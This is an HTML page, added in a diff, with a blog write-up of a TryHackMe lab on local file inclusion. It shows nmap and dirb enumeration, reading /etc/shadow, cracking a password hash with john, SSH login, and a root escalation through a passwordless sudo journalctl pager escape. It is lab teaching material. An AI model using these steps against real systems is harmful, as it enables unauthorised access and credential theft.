@@ -1,0 +1,281 @@
+
+<head>
+    <meta charset="utf-8">
+
+    <title>Local file inclusion | write-up</title>
+
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+
+    <link rel="shortcut icon" href="../../favicon.png" type="image/png">
+    <link rel="canonical" href="../index.html">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="fr33s0ul">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Local file inclusion | write-up">
+    <meta property="og:description" content="Hello everyone, here's a quick write-up about LFI that I really recommend for people just starting in the field. It's created by a user called falconfeast feel free to visit his room. TryHackMe | Hacking TrainingAn online platform for learning and teaching cyber security, all through your browser.TryHackMeEnumeration root@kali:">
+    <meta property="og:url" content="https://fr33s0ul.tech/lfi/">
+    <meta property="og:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/653aa50b92574882f.png">
+    <meta property="article:published_time" content="2020-04-17T19:48:26.000Z">
+    <meta property="article:modified_time" content="2020-04-17T19:51:54.000Z">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Local file inclusion | write-up">
+    <meta name="twitter:description" content="Hello everyone, here's a quick write-up about LFI that I really recommend for people just starting in the field. It's created by a user called falconfeast feel free to visit his room. TryHackMe | Hacking TrainingAn online platform for learning and teaching cyber security, all through your browser.TryHackMeEnumeration root@kali:">
+    <meta name="twitter:url" content="https://fr33s0ul.tech/lfi/">
+    <meta name="twitter:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/653aa50b92574882f.png">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="fr33s0ul">
+    <meta name="twitter:site" content="@fr33soul_">
+    <meta name="twitter:creator" content="@fr33soul_">
+    <meta property="og:image:width" content="709">
+    <meta property="og:image:height" content="402">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "fr33s0ul",
+        "url": "https://fr33s0ul.tech/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": {
+                "@type": "ImageObject",
+                "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/logo.gif",
+                "width": 300,
+                "height": 41
+            }
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "fr33s0ul",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/asdasd.gif",
+            "width": 600,
+            "height": 594
+        },
+        "url": "https://fr33s0ul.tech/author/fr33s0ul/",
+        "sameAs": [
+            "https://twitter.com/fr33soul_"
+        ]
+    },
+    "headline": "Local file inclusion | write-up",
+    "url": "https://fr33s0ul.tech/lfi/",
+    "datePublished": "2020-04-17T19:48:26.000Z",
+    "dateModified": "2020-04-17T19:51:54.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/04/653aa50b92574882f.png",
+        "width": 709,
+        "height": 402
+    },
+    "description": "Hello everyone, here&#x27;s a quick write-up about LFI that I really recommend for\npeople just starting in the field. It&#x27;s created by a user called falconfeast\n[https://tryhackme.com/p/falconfeast] feel free to visit his room.\n\nTryHackMe | Hacking TrainingAn online platform for learning and teaching cyber\nsecurity, all through your browser.TryHackMe [https://tryhackme.com]&gt; Enumeration \nroot@kali:~# nmap -sC -sV 10.10.104.39\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 19:00 UTC\nNmap scan re",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://fr33s0ul.tech/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 3.13">
+    <link rel="alternate" type="application/rss+xml" title="fr33s0ul" href="../../rss/index.html">
+
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic%7COpen+Sans:700,600,400">
+    <style amp-custom>html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:bold}dfn{font-style:italic}h1{margin:0.67em 0;font-size:2em}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{position:relative;vertical-align:baseline;font-size:75%;line-height:0}sup{top:-0.5em}sub{bottom:-0.25em}img{border:0}amp-img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace, monospace;font-size:1em}button,input,optgroup,select,textarea{margin:0;color:inherit;font:inherit}button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{cursor:pointer;-webkit-appearance:button}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{padding:0;border:0}input{line-height:normal}input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}input[type="number"]::-webkit-inner-spin-button,input[type="number"]::-webkit-outer-spin-button{height:auto}input[type="search"]{-webkit-appearance:textfield}input[type="search"]::-webkit-search-cancel-button,input[type="search"]::-webkit-search-decoration{-webkit-appearance:none}fieldset{margin:0 2px;padding:0.35em 0.625em 0.75em;border:1px solid #c0c0c0}legend{padding:0;border:0}textarea{overflow:auto}optgroup{font-weight:bold}table{border-spacing:0;border-collapse:collapse}td,th{padding:0}html{max-height:100%;height:100%;font-size:62.5%;-webkit-tap-highlight-color:rgba(0, 0, 0, 0)}body{max-height:100%;height:100%;color:#3a4145;background:#f4f8fb;letter-spacing:0.01rem;font-family:"Merriweather", serif;font-size:1.8rem;line-height:1.75em;text-rendering:geometricPrecision;-webkit-font-feature-settings:"kern" 1;-moz-font-feature-settings:"kern" 1;-o-font-feature-settings:"kern" 1}::-moz-selection{background:#d6edff}::selection{background:#d6edff}h1,h2,h3,h4,h5,h6{margin:0 0 0.3em 0;color:#2e2e2e;font-family:"Open Sans", sans-serif;line-height:1.15em;text-rendering:geometricPrecision;-webkit-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1;-moz-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1;-o-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1}h1{text-indent:-2px;letter-spacing:-1px;font-size:2.6rem}h2{letter-spacing:0;font-size:2.4rem}h3{letter-spacing:-0.6px;font-size:2.1rem}h4{font-size:1.9rem}h5{font-size:1.8rem}h6{font-size:1.8rem}a{color:#4a4a4a}a:hover{color:#111}p,ul,ol,dl{margin:0 0 2.5rem 0;font-size:1.5rem;text-rendering:geometricPrecision;-webkit-font-feature-settings:"liga" 1, "onum" 1, "kern" 1;-moz-font-feature-settings:"liga" 1, "onum" 1, "kern" 1;-o-font-feature-settings:"liga" 1, "onum" 1, "kern" 1}ol,ul{padding-left:2em}ol ol,ul ul,ul ol,ol ul{margin:0 0 0.4em 0;padding-left:2em}dl dt{float:left;clear:left;overflow:hidden;margin-bottom:1em;width:180px;text-align:right;text-overflow:ellipsis;white-space:nowrap;font-weight:700}dl dd{margin-bottom:1em;margin-left:200px}li{margin:0.4em 0}li li{margin:0}hr{display:block;margin:1.75em 0;padding:0;height:1px;border:0;border-top:#efefef 1px solid}blockquote{box-sizing:border-box;margin:1.75em 0 1.75em 0;padding:0 0 0 1.75em;border-left:#4a4a4a 0.4em solid;-moz-box-sizing:border-box}blockquote p{margin:0.8em 0;font-style:italic}blockquote small{display:inline-block;margin:0.8em 0 0.8em 1.5em;color:#ccc;font-size:0.9em}blockquote small:before{content:"\2014 \00A0"}blockquote cite{font-weight:700}blockquote cite a{font-weight:normal}mark{background-color:#fdffb6}code,tt{padding:1px 3px;border:#e3edf3 1px solid;background:#f7fafb;border-radius:2px;white-space:pre-wrap;font-family:Inconsolata, monospace, sans-serif;font-size:0.85em;font-feature-settings:"liga" 0;-webkit-font-feature-settings:"liga" 0;-moz-font-feature-settings:"liga" 0}pre{overflow:auto;box-sizing:border-box;margin:0 0 1.75em 0;padding:10px;width:100%;border:#e3edf3 1px solid;background:#f7fafb;border-radius:3px;white-space:pre;font-family:Inconsolata, monospace, sans-serif;font-size:0.9em;-moz-box-sizing:border-box}pre code,pre tt{padding:0;border:none;background:transparent;white-space:pre-wrap;font-size:inherit}kbd{display:inline-block;margin-bottom:0.4em;padding:1px 8px;border:#ccc 1px solid;background:#f4f4f4;border-radius:4px;box-shadow:0 1px 0 rgba(0, 0, 0, 0.2), 0 1px 0 0 #fff inset;color:#666;text-shadow:#fff 0 1px 0;font-size:0.9em;font-weight:700}table{box-sizing:border-box;margin:1.75em 0;max-width:100%;width:100%;background-color:transparent;-moz-box-sizing:border-box}table th,table td{padding:8px;border-top:#efefef 1px solid;vertical-align:top;text-align:left;line-height:20px}table th{color:#000}table caption + thead tr:first-child th,table caption + thead tr:first-child td,table colgroup + thead tr:first-child th,table colgroup + thead tr:first-child td,table thead:first-child tr:first-child th,table thead:first-child tr:first-child td{border-top:0}table tbody + tbody{border-top:#efefef 2px solid}table table table{background-color:#fff}table tbody > tr:nth-child(odd) > td,table tbody > tr:nth-child(odd) > th{background-color:#f6f6f6}table.plain tbody > tr:nth-child(odd) > td,table.plain tbody > tr:nth-child(odd) > th{background:transparent}iframe,amp-iframe,.fluid-width-video-wrapper{display:block;margin:1.75em 0}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper amp-iframe{margin:0}textarea,select,input{margin:0 0 5px 0;padding:6px 9px;width:260px;outline:0;border:#e7eef2 1px solid;background:#fff;border-radius:4px;box-shadow:none;font-family:"Open Sans", sans-serif;font-size:1.6rem;line-height:1.4em;font-weight:100;-webkit-appearance:none}textarea{min-width:250px;min-height:80px;max-width:340px;width:100%;height:auto}input[type="text"]:focus,input[type="email"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="number"]:focus,input[type="date"]:focus,input[type="month"]:focus,input[type="week"]:focus,input[type="time"]:focus,input[type="datetime"]:focus,input[type="datetime-local"]:focus,textarea:focus{outline:none;outline-width:0;border:#bbc7cc 1px solid;background:#fff}select{width:270px;height:30px;line-height:30px}.clearfix:before,.clearfix:after{content:" ";display:table}.clearfix:after{clear:both}.clearfix{zoom:1}.main-header{position:relative;display:table;overflow:hidden;box-sizing:border-box;width:100%;height:50px;background:#5ba4e5 no-repeat center center;background-size:cover;text-align:left;-webkit-box-sizing:border-box;-moz-box-sizing:border-box}.content{background:#fff;padding-top:15px}.blog-title,.content{margin:auto;max-width:600px}.blog-title a{display:block;padding-right:16px;padding-left:16px;height:50px;color:#fff;text-decoration:none;font-family:"Open Sans", sans-serif;font-size:16px;line-height:50px;font-weight:600}.post{position:relative;margin-top:0;margin-right:16px;margin-left:16px;padding-bottom:0;max-width:100%;border-bottom:#ebf2f6 1px solid;word-wrap:break-word;font-size:0.95em;line-height:1.65em}.post-header{margin-bottom:1rem}.post-title{margin-bottom:0}.post-title a{text-decoration:none}.post-meta{display:block;margin:3px 0 0 0;color:#9eabb3;font-family:"Open Sans", sans-serif;font-size:1.3rem;line-height:2.2rem}.post-meta a{color:#9eabb3;text-decoration:none}.post-meta a:hover{text-decoration:underline}.post-meta .author{margin:0;font-size:1.3rem;line-height:1.3em}.post-date{display:inline-block;text-transform:uppercase;white-space:nowrap;font-size:1.2rem;line-height:1.2em}.post-image{margin:0;padding-top:3rem;padding-bottom:30px;border-top:1px #E8E8E8 solid}.post-content amp-img,.post-content amp-anim{position:relative;left:50%;display:block;padding:0;min-width:0;max-width:112%;width:calc(100% + 32px);height:auto;transform:translateX(-50%);-webkit-transform:translateX(-50%);-ms-transform:translateX(-50%)}.footnotes{font-size:1.3rem;line-height:1.6em;font-style:italic}.footnotes li{margin:0.6rem 0}.footnotes p{margin:0}.footnotes p a:last-child{text-decoration:none}.site-footer{position:relative;margin:0 auto 20px auto;padding:1rem 15px;max-width:600px;color:rgba(0,0,0,0.5);font-family:"Open Sans", sans-serif;font-size:1.1rem;line-height:1.75em}.site-footer a{color:rgba(0,0,0,0.5);text-decoration:none;font-weight:bold}.site-footer a:hover{border-bottom:#bbc7cc 1px solid}.poweredby{display:block;float:right;width:45%;text-align:right}.copyright{display:block;float:left;width:45%}</style>
+
+    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+
+    <script async custom-element="amp-iframe" src="https://cdn.ampproject.org/v0/amp-iframe-0.1.js"></script>
+
+</head>
+
+<body class="amp-template">
+    <header class="main-header">
+        <nav class="blog-title">
+            <a href="../../">fr33s0ul</a>
+        </nav>
+    </header>
+
+    <main class="content" role="main">
+        <article class="post">
+
+            <header class="post-header">
+                <h1 class="post-title">Local file inclusion | write-up</h1>
+                <section class="post-meta">
+                    <p class="author">by <a href="../../author/fr33s0ul/">fr33s0ul</a></p>
+                    <time class="post-date" datetime="2020-04-17">2020-04-17</time>
+                </section>
+            </header>
+            <figure class="post-image">
+                <amp-img src="https://fr33s0ul.tech/content/images/size/w1000/2020/04/653aa50b92574882f.png" width="600" height="400" layout="responsive"></amp-img>
+            </figure>
+            <section class="post-content">
+
+                <p>Hello everyone, here's a quick write-up about LFI that I really recommend for people just starting in the field. It's created by a user called <a href="https://tryhackme.com/p/falconfeast"><strong>falconfeast</strong></a><strong> </strong>feel free to visit his room.</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | Hacking Training</div><div class="kg-bookmark-description">An online platform for learning and teaching cyber security, all through your browser.</div><div class="kg-bookmark-metadata"><amp-img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" width="552" height="564" layout="responsive"></amp-img><span class="kg-bookmark-publisher">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><amp-img src="https://tryhackme.com/img/favicon.png" width="552" height="564" layout="responsive"></amp-img></div></a></figure><blockquote>Enumeration </blockquote><pre><code>root@kali:~# nmap -sC -sV 10.10.104.39
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 19:00 UTC
+Nmap scan report for ip-10-10-104-39.eu-west-1.compute.internal (10.10.104.39)
+Host is up (0.00079s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a8:b9:f0:d3:e4:b3:17:9c:7f:b6:7d:28:72:8a:e4:77 (RSA)
+|   256 07:f2:d9:85:77:74:52:2a:73:76:70:35:73:70:c3:9e (ECDSA)
+|_  256 23:ba:e8:b6:8b:a2:ac:58:3b:f4:04:dc:6e:36:b7:f2 (ED25519)
+80/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.6.9)
+|_http-title: Shop
+MAC Address: 02:24:A4:61:CD:74 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.74 seconds
+root@kali:~#</code></pre><pre><code>root@kali:~# dirb http://10.10.104.39
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Apr 17 19:23:58 2020
+URL_BASE: http://10.10.104.39/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.104.39/ ----
++ http://10.10.104.39/home (CODE:200|SIZE:4116)                                    
+                                                                                   
+-----------------
+END_TIME: Fri Apr 17 19:25:08 2020
+DOWNLOADED: 4612 - FOUND: 1
+root@kali:~#</code></pre><figure class="kg-card kg-image-card"></figure><figure class="kg-card kg-image-card"></figure><figure class="kg-card kg-image-card"></figure><figure class="kg-card kg-image-card"></figure><p>I next tried to see if the user falcon have access to <strong>/etc/shadow </strong>and yes ... </p><amp-iframe src="https://giphy.com/embed/rlL4XHR60GPew" width="480" height="341" frameborder="0" class="giphy-embed" allowfullscreen sandbox="allow-scripts allow-same-origin" layout="responsive"></amp-iframe><p><a href="https://giphy.com/gifs/transparent-rlL4XHR60GPew"></a></p>
+<p>Let's decrypt the hash and see if we have any luck on this one</p><pre><code>root@kali:~# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+xxxxxxxxxx       (falcon)
+1g 0:00:00:07 DONE (2020-04-17 19:23) 0.1254g/s 2376p/s 2376c/s 2376C/s soldado..playas
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@kali:~#</code></pre><pre><code>root@kali:~# ssh falcon@10.10.104.39
+The authenticity of host '10.10.104.39 (10.10.104.39)' can't be established.
+ECDSA key fingerprint is SHA256:K4V/ri6osqzorAUTBrYc1jiyx8Uiy22Uf1qqH6O4Iho.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes            
+Warning: Permanently added '10.10.104.39' (ECDSA) to the list of known hosts.       
+falcon@10.10.104.39's password:                                                     
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)                  
+                                                                                    
+ * Documentation:  https://help.ubuntu.com                                          
+ * Management:     https://landscape.canonical.com                                  
+ * Support:        https://ubuntu.com/advantage                                     
+                                                                                    
+  System information as of Sat Apr 18 00:54:49 IST 2020                             
+                                                                                    
+  System load:  0.72              Processes:           84                           
+  Usage of /:   31.4% of 9.78GB   Users logged in:     0                            
+  Memory usage: 16%               IP address for eth0: 10.10.104.39                 
+  Swap usage:   0%                                                                  
+                                                                                    
+                                                                                    
+6 packages can be updated.                                                          
+3 updates are security updates.                                                     
+                                                                                    
+                                                                                    
+Last login: Wed Jan 29 20:13:44 2020 from 192.168.1.107                             
+falcon@walk:~$                                                                      
+              </code></pre><p>and we are user falcon, I'm pretty sure that there's another way in so feel free to dive in.</p><figure class="kg-card kg-code-card"><pre><code>falcon@walk:~$ ls                                                                   
+user.txt                                                                            
+falcon@walk:~$ cat user.txt                                                         
+XXXXXXXXXXXXXXXXXXXX                                                                
+falcon@walk:~$ sudo -l
+Matching Defaults entries for falcon on walk:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User falcon may run the following commands on walk:
+    (root) NOPASSWD: /bin/journalctl
+falcon@walk:~$</code></pre><figcaption>The user can use /bin/journalctl as root without password.</figcaption></figure><pre><code>falcon@walk:~$ sudo /bin/journalctl 
+-- Logs begin at Tue 2020-01-28 19:00:21 IST, end at Sat 2020-04-18 00:58:39 IST. --
+Jan 28 19:00:21 walk kernel: Linux version 4.15.0-20-generic (buildd@lgw01-amd64-039
+Jan 28 19:00:21 walk kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-4.15.0-20-generi
+Jan 28 19:00:21 walk kernel: KERNEL supported cpus:
+Jan 28 19:00:21 walk kernel:   Intel GenuineIntel
+Jan 28 19:00:21 walk kernel:   AMD AuthenticAMD
+Jan 28 19:00:21 walk kernel:   Centaur CentaurHauls
+Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating 
+Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers
+Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers
+Jan 28 19:00:21 walk kernel: x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
+Jan 28 19:00:21 walk kernel: x86/fpu: Enabled xstate features 0x7, context size is 8
+Jan 28 19:00:21 walk kernel: e820: BIOS-provided physical RAM map:
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x0000000000100000-0x000000003ffeffff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x000000003fff0000-0x000000003fffffff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fec00000-0x00000000fec00fff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fee00000-0x00000000fee00fff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] 
+Jan 28 19:00:21 walk kernel: NX (Execute Disable) protection: active
+Jan 28 19:00:21 walk kernel: random: fast init done
+Jan 28 19:00:21 walk kernel: SMBIOS 2.5 present.
+Jan 28 19:00:21 walk kernel: DMI: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBo
+Jan 28 19:00:21 walk kernel: Hypervisor detected: KVM
+Jan 28 19:00:21 walk kernel: e820: update [mem 0x00000000-0x00000fff] usable ==&gt; res
+Jan 28 19:00:21 walk kernel: e820: remove [mem 0x000a0000-0x000fffff] usable
+Jan 28 19:00:21 walk kernel: e820: last_pfn = 0x3fff0 max_arch_pfn = 0x400000000
+Jan 28 19:00:21 walk kernel: MTRR default type: uncachable
+Jan 28 19:00:21 walk kernel: MTRR variable ranges disabled:
+Jan 28 19:00:21 walk kernel: MTRR: Disabled
+Jan 28 19:00:21 walk kernel: x86/PAT: MTRRs disabled, skipping PAT initialization to
+Jan 28 19:00:21 walk kernel: CPU MTRRs all blank - virtualized system.
+Jan 28 19:00:21 walk kernel: x86/PAT: Configuration [0-7]: WB  WT  UC- UC  WB  WT  U
+Jan 28 19:00:21 walk kernel: found SMP MP-table at [mem 0x0009fff0-0x0009ffff] mappe
+Jan 28 19:00:21 walk kernel: Scanning 1 areas for low memory corruption
+Jan 28 19:00:21 walk kernel: Base memory trampoline at [        (ptrval)] 99000 size
+Jan 28 19:00:21 walk kernel: BRK [0x2493e000, 0x2493efff] PGTABLE
+Jan 28 19:00:21 walk kernel: BRK [0x2493f000, 0x2493ffff] PGTABLE
+Jan 28 19:00:21 walk kernel: BRK [0x24940000, 0x24940fff] PGTABLE
+Jan 28 19:00:21 walk kernel: BRK [0x24941000, 0x24941fff] PGTABLE
+Jan 28 19:00:21 walk kernel: BRK [0x24942000, 0x24942fff] PGTABLE
+Jan 28 19:00:21 walk kernel: RAMDISK: [mem 0x31777000-0x34bb2fff]
+Jan 28 19:00:21 walk kernel: ACPI: Early table checksum verification disabled
+Jan 28 19:00:21 walk kernel: ACPI: RSDP 0x00000000000E0000 000024 (v02 VBOX  )
+Jan 28 19:00:21 walk kernel: ACPI: XSDT 0x000000003FFF0030 00003C (v01 VBOX   VBOXXS
+Jan 28 19:00:21 walk kernel: ACPI: FACP 0x000000003FFF00F0 0000F4 (v04 VBOX   VBOXFA
+!/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls -la /root
+total 32
+drwx------  5 root root 4096 Jan 30 21:41 .
+drwxr-xr-x 23 root root 4096 Jan 28 19:29 ..
+lrwxrwxrwx  1 root root    9 Jan 30 21:41 .bash_history -&gt; /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  3 root root 4096 Jan 28 23:21 .cache
+drwx------  3 root root 4096 Jan 28 19:14 .gnupg
+drwxr-xr-x  3 root root 4096 Jan 28 23:11 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   21 Jan 29 19:52 root.txt
+# 
+</code></pre><p>and we are root ! Enjoy your flags.</p><p>Happy Hacking!</p>
+
+            </section>
+
+        </article>
+    </main>
+    <footer class="site-footer clearfix">
+        <section class="copyright"><a href="../../">fr33s0ul</a> © 2020</section>
+        <section class="poweredby">Proudly published with <a href="https://ghost.org">Ghost</a></section>
+    </footer>
+</body>
